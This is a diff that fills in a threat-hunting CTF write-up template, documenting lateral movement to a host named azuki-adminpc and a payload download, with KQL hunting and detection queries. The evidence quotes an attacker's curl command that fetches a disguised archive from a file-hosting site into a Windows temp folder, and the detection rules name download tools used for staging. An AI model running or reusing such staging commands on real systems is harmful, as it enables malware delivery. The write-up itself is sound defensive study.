@@ -161,36 +161,51 @@ DeviceLogonEvents
 <hr>
 <br>
 
-### 🚩 Flag # – [Flag Title]
+### 🚩 Flag #3: LATERAL MOVEMENT - Target Device
 **🎯 Objective**  
-[Describe the objective of this flag in 1-2 sentences.]
+Attackers select high-value targets based on user roles and data access. Identifying the compromised device reveals what information was at risk.
 
 **📌 Finding**  
-[Your finding/answer here, e.g., specific command or artifact.]
+azuki-adminpc
 
 **🔍 Evidence**
 
 | Field            | Value                                      |
 |------------------|--------------------------------------------|
-| Host             | [e.g., victim-vm]                          |
-| Timestamp        | [e.g., 2025-12-11T12:00:00Z]               |
-| Process          | [e.g., powershell.exe]                     |
-| Parent Process   | [e.g., explorer.exe]                       |
-| Command Line     | `[Your command line here]`                 |
+| Host             | azuki-adminpc                              |
+| Timestamp        | Nov 25, 2025 1:09:18 PM                    |
+| Process          | svchost.exe                                |
+| Parent Process   | services.exe                               |
+| Command Line     | 'svchost.exe -k netsvcs -p`                |
 
 **💡 Why it matters**  
-[Explain the impact, real-world relevance, MITRE mapping, and why this is a high-signal indicator. 4-6 sentences for depth.]
+The device azuki-adminpc is the high-value target the attacker successfully reached through lateral movement.
+Its name ("adminpc") and role suggest it belongs to an administrator or executive, meaning it likely has elevated privileges, access to sensitive systems, and valuable data.
+Identifying this target device early shows the attacker is no longer limited to the initial compromised machine — they now control a system with much greater potential for damage, such as domain admin rights or confidential files.
+Knowing the exact compromised target allows defenders to prioritize isolation, forensic analysis, and containment on that machine before the attacker goes further (MITRE ATT&CK T1021 – Remote Services combined with T1082 – System Information Discovery to select high-value assets).
 
 **🔧 KQL Query Used**
 ```
-[Your exact KQL query here]
+DeviceLogonEvents
+| where Timestamp between (startofday(datetime(2025-11-24)) .. endofday(datetime(2025-11-26)))
+| where DeviceName contains "azuki"
+| where LogonType contains "remote"
+| order by Timestamp desc
 ```
 **🖼️ Screenshot**
-[Your screenshot here]
+<img width="498" height="810" alt="image" src="https://github.com/user-attachments/assets/3d0c7a2a-de6b-452a-a0f1-00b1c5b7f781" />
 
 **🛠️ Detection Recommendation**
 ```
-[Your exact KQL query here]
+DeviceLogonEvents
+| where Timestamp > ago(30d)                              // Adjust time window as needed
+| where LogonType in ("RemoteInteractive", "Network")     // RDP or network logons – common for lateral movement
+| where isnotempty(RemoteIP)                              // Only remote logons
+| extend IsInternalSource = RemoteIP startswith "10." or RemoteIP startswith "192.168." or (RemoteIP startswith "172." and toint(split(RemoteIP, ".")[1]) >= 16 and toint(split(RemoteIP, ".")[1]) <= 31)
+| where IsInternalSource == true                           // Focus on logons from internal IPs (lateral signal)
+| summarize LogonCount = count(), SourceIPs = make_set(RemoteIP) by DeviceName
+| project DeviceName, LogonCount, SourceIPs
+| order by LogonCount desc
 ```
 
 
@@ -200,36 +215,60 @@ DeviceLogonEvents
 
 
 
-### 🚩 Flag # – [Flag Title]
+### 🚩 Flag #4: EXECUTION - Payload Hosting Service
 **🎯 Objective**  
-[Describe the objective of this flag in 1-2 sentences.]
+Attackers rotate infrastructure between operations to evade network blocks and threat intelligence feeds. Documenting new domains is critical for prevention.
 
 **📌 Finding**  
-[Your finding/answer here, e.g., specific command or artifact.]
+litter.catbox.moe
 
 **🔍 Evidence**
 
 | Field            | Value                                      |
 |------------------|--------------------------------------------|
-| Host             | [e.g., victim-vm]                          |
-| Timestamp        | [e.g., 2025-12-11T12:00:00Z]               |
+| Host             | azuki-adminpc                         |
+| Timestamp        | Nov 25, 2025 11:21:12 AM            |
 | Process          | [e.g., powershell.exe]                     |
-| Parent Process   | [e.g., explorer.exe]                       |
-| Command Line     | `[Your command line here]`                 |
+| Parent Process   | curl.exe                     |
+| Command Line     | "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z           |
 
 **💡 Why it matters**  
-[Explain the impact, real-world relevance, MITRE mapping, and why this is a high-signal indicator. 4-6 sentences for depth.]
+The attacker used an external file hosting service (different from the one in CTF 2) to stage and download malware payloads onto the compromised system.
+This rotation of hosting infrastructure is a common tactic to evade detection — using temporary or lesser-known file sharing sites makes it harder for security tools to block or flag the downloads in advance.
+Identifying the specific hosting service is important because it reveals the attacker's current staging location, helps block it at the network level, and can be shared with threat intel feeds to protect other organizations (MITRE ATT&CK T1608.001 – Stage Capabilities).
 
 **🔧 KQL Query Used**
+This KQL is an attempt at me to learn new things with AI as a teacher so I can't take full credit for this but it was my idea to search the filename for keywords that led to finding the artifact.
 ```
-[Your exact KQL query here]
+DeviceNetworkEvents
+| where Timestamp between (startofday(datetime(2025-11-24)) .. endofday(datetime(2025-11-26)))
+| where DeviceName contains "azuki"
+| where RemotePort in (80, 443)
+| where RemoteIPType == "Public"
+| where isnotempty(RemoteUrl)
+| extend Host = iff(RemoteUrl contains "://", tostring(split(split(RemoteUrl, "://")[1], "/")[0]), tostring(split(RemoteUrl, "/")[0]))  // Robust extraction
+| where Host !contains "microsoft" and Host !contains "azure" and Host !contains "cloudapp" and Host !contains "wns" and Host !contains "windowsupdate"
+| where RemoteUrl has_any(".exe", ".zip", ".ps1", ".dll", ".bin", ".sh") or InitiatingProcessFileName has_any("powershell", "python", "curl", "wget")
+| project Timestamp, DeviceName, RemoteUrl, Host, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by Timestamp desc
 ```
 **🖼️ Screenshot**
-[Your screenshot here]
+<img width="1782" height="201" alt="image" src="https://github.com/user-attachments/assets/19e1f965-a479-4a8c-90e1-34c752970e37" />
+
 
 **🛠️ Detection Recommendation**
 ```
-[Your exact KQL query here]
+DeviceNetworkEvents
+| where Timestamp > ago(30d)                              // Adjust time window as needed
+| where RemotePort in (80, 443)
+| where RemoteIPType == "Public"
+| where isnotempty(RemoteUrl)
+| extend Host = tostring(parse_url(RemoteUrl).Host)
+| where Host !contains "microsoft" and Host !contains "azure" and Host !contains "windowsupdate" and Host !contains "akamai"
+| where InitiatingProcessFileName in ("powershell.exe", "curl.exe", "certutil.exe", "bitsadmin.exe", "wget.exe")
+| where RemoteUrl has_any(".exe", ".zip", ".7z", ".ps1", ".dll", ".bin", ".tar")
+| project Timestamp, DeviceName, RemoteUrl, Host, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by Timestamp desc
 ```
 
 
